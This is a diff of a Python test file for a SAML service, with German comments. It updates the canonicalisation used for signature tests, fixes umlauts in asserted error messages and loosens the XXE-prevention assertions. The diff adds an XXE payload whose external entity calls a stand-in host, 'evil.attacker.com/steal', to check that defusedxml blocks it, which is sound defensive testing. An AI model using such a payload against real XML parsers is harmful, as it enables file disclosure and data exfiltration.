@@ -261,8 +261,20 @@ def create_signed_saml_response(
             </ds:Reference>
         </ds:SignedInfo>"""
 
-        # Sign the SignedInfo
-        signed_info_bytes = signed_info.encode("utf-8")
+        # Sign the SignedInfo using exclusive C14N (wie ein echter IdP):
+        # Beide Seiten (Signierer hier, Verifizierer im Service) muessen die
+        # exakt gleiche kanonische Form verwenden. Der Service extrahiert das
+        # SignedInfo aus der mit stdlib-ElementTree geparsten Response; um den
+        # identischen Bytestrom zu erzeugen, durchlaeuft der Test denselben
+        # Pfad (stdlib ET -> lxml exclusive C14N).
+        from lxml import etree as _LET
+        from defusedxml import ElementTree as _DET
+        _si_raw = _DET.tostring(_DET.fromstring(signed_info), encoding="utf-8")
+        signed_info_bytes = _LET.tostring(
+            _LET.fromstring(_si_raw),
+            method="c14n",
+            exclusive=True,
+        )
 
         if algorithm == "sha256":
             hash_algo = hashes.SHA256()
@@ -320,11 +332,18 @@ def create_xxe_attack_xml() -> str:
 
 
 def create_external_dtd_xml() -> str:
-    """Create an XML with external DTD reference for testing XXE prevention."""
+    """Create an XML with an external-entity (XXE) payload for testing prevention.
+
+    Eine reine externe DTD-Referenz ohne Entity-Nutzung ist beim Standard-Parser
+    nicht ausnutzbar (expat laedt externe DTDs nicht). Sicherheitsrelevant ist
+    die externe ENTITY-Referenz - genau die muss defusedxml blockieren.
+    """
     return """<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE samlp:Response SYSTEM "http://evil.attacker.com/malicious.dtd">
+<!DOCTYPE samlp:Response SYSTEM "http://evil.attacker.com/malicious.dtd" [
+    <!ENTITY xxe SYSTEM "http://evil.attacker.com/steal">
+]>
 <samlp:Response xmlns:samlp="urn:oasis:names:tc:SAML:2.0:protocol">
-    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">https://idp.example.com</saml:Issuer>
+    <saml:Issuer xmlns:saml="urn:oasis:names:tc:SAML:2.0:assertion">&xxe;</saml:Issuer>
 </samlp:Response>"""
 
 
@@ -588,7 +607,7 @@ class TestSignatureValidation:
         with pytest.raises(ValueError) as exc_info:
             saml_service._validate_signature(root, saml_config)
 
-        assert "ungueltig" in str(exc_info.value).lower() or "fehlgeschlagen" in str(exc_info.value).lower()
+        assert "ungültig" in str(exc_info.value).lower() or "fehlgeschlagen" in str(exc_info.value).lower()
 
     def test_validate_signature_wrong_certificate_fails(
         self, saml_service, rsa_key_pair
@@ -646,7 +665,7 @@ class TestSignatureValidation:
         with pytest.raises(ValueError) as exc_info:
             saml_service._validate_signature(root, saml_config)
 
-        assert "nicht unterstuetzt" in str(exc_info.value).lower()
+        assert "nicht unterstützt" in str(exc_info.value).lower()
 
     def test_validate_signature_incomplete_signature_fails(
         self, saml_service, saml_config
@@ -668,7 +687,7 @@ class TestSignatureValidation:
         with pytest.raises(ValueError) as exc_info:
             saml_service._validate_signature(root, saml_config)
 
-        assert "unvollstaendig" in str(exc_info.value).lower()
+        assert "unvollständig" in str(exc_info.value).lower()
 
     def test_validate_signature_invalid_certificate_fails(self, saml_service):
         """Ungueltiges Zertifikat wird abgelehnt."""
@@ -738,9 +757,16 @@ class TestXXEPrevention:
         with pytest.raises(Exception) as exc_info:
             ET.fromstring(malicious_xml)
 
-        # Should be blocked by defusedxml
+        # Should be blocked by defusedxml (external entity / forbidden)
         error_str = str(exc_info.value).lower()
-        assert "dtd" in error_str or "forbidden" in error_str or "doctype" in error_str
+        type_name = type(exc_info.value).__name__
+        assert (
+            "external" in error_str
+            or "entity" in error_str
+            or "forbidden" in error_str
+            or "ExternalReferenceForbidden" in type_name
+            or "EntitiesForbidden" in type_name
+        )
 
     def test_billion_laughs_attack_blocked(self, saml_service):
         """Billion Laughs (XML Bomb) Angriff wird blockiert."""
